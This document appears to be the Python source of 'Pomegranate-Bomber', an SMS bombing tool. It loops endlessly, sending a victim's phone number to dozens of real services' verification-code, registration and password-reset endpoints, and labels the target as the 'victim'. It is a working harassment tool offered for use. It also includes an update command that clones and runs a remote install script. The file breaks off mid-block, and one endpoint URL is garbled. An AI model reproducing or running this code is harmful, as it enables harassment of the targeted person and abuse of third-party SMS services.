#!/usr/bin/python3
# spammer v0.5 beta
# Author: @Mrxanon and @NexlsHere
# https://github.com/Mrx-Anonym/Pomegranate-Bomber
class Pomegranate:
	def main(self):
		import requests
		import random
		import datetime
		import sys
		import time
		import argparse
		import os
		import json
		from colorama import Fore, Back, Style

		os.system("clear")
		print(Fore.GREEN + '''
##################################################
#------------------------------------------------#
##----------##########################----------##
###--####--#88888888888888888888888888#--####--###
####--##--##88888888888888888888888888##--##--####
#####----###888        8888        888###----#####
######--####888  8888  8888  8888   88####--######
#####----###888  8888  8888  8888   88###----#####
####--##--##888  8888  8888  8888   88##--##--####
###--####--#888        8888        888#--####--###
####--##--##888  8888888888  8888   88##--##--####
#####----###888  8888888888  8888   88###----#####
######--####888  8888888888  8888   88####--######
#####----###888  88888  888        888###----#####
####--##--##88888888888888888888888888##--##--####
###--####--#88888888888888888888888888#--####--###
####--##--##88     @Mrxanon         88##--##--####
#####----###88     @NexlsHere       88###----#####
######--####88     SMS Spammer      88####--######
#####----###88     V.0.4 (beta)     88###----#####
####--##--##88888888888888888888888888##--##--####
###--####--#88888888888888888888888888#--####--###
##----------##########################----------##
#------------------------------------------------#
##################################################'''+Style.RESET_ALL+Fore.RED+'''

##################################################
##   Before you start using this utility,       ##
##   we want to say - that you do everything    ##
##   at your own peril and risk!                ##
##   We are not responsible                     ##
##   for what you do with this utility!         ##
##################################################
'''+Style.RESET_ALL+Fore.BLUE+'''
##################################################
##   Write the phone number without "+"         ##
##   Start command: Pomegranate-Bomber "Phone"  ##
##################################################
''')

		print(Style.RESET_ALL)
		parser = argparse.ArgumentParser(prog='Pomegranate-Bomber', description="Maybe something is no longer working.",epilog='Telegram- @Mrxanon and @NexlsHere')
		parser.add_argument('phonenum', metavar='phone', help='Victims phone number (example: 79991234455)')
		args = parser.parse_args()
		_phone = args.phonenum

		if _phone == "update":
			cmd = os.system("cd && rm -rf ~/Pomegranate-Bomber && git clone https://github.com/Mrx-Anonym/Pomegranate-Bomber && sh ~/Pomegranate-Bomber/install.sh")
			exit()

		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'
		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print('\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn'))
				exit()
		_phone = args.phonenum
		if _phone[0] == '+':
			_phone = _phone[1:]
		if _phone[0] == '8':
			_phone = '7'+_phone[1:]
		if _phone[0] == '9':
			_phone = '7'+_phone
		
		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		iteration = 0			
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		print(showstatus(wrapsbrace('info', True) + ('SMS sending to: +{}').format(_phone)))
		print('Spammer launched.\nIf you want stop, press "Ctrl + Z".')
		i = 1
		iteration = 0
		while i < 2:
			try:
				self.formatted_phone = _phone
				_email = _name+f'{iteration}'+'@gmail.com'
				email = _name+f'{iteration}'+'@gmail.com'
				
				try:
					requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + self.formatted_phone, "api": 2, "email": "email","x-email": "x-email"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": self.formatted_phone, "recaptcha": 'off', "g-recaptcha-response": ""})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://plink.tech/register/',json={"phone": self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("http://smsgorod.ru/sendsms.php",data={"number": self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": self.formatted_phone,"username": username})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': self.formatted_phone},headers={'App-ID': 'cabinet'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": self.formatted_phone, "type": 2})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": self.formatted_phone, "deliveryOption": "sms"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": self.formatted_phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.citilink.ru/registration/confirm/phone/+' + self.formatted_phone + '/')
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": self.formatted_phone, "SignupForm[device_type]": 3})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.get('https://findclone.ru/register', params={'phone': '+' + self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': self.formatted_phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + self.formatted_phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://youdo.com/api/verification/sendverificationcode/', data={'PhoneE164':_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('htMrxtps://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://plink.tech/register/',json={"phone": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
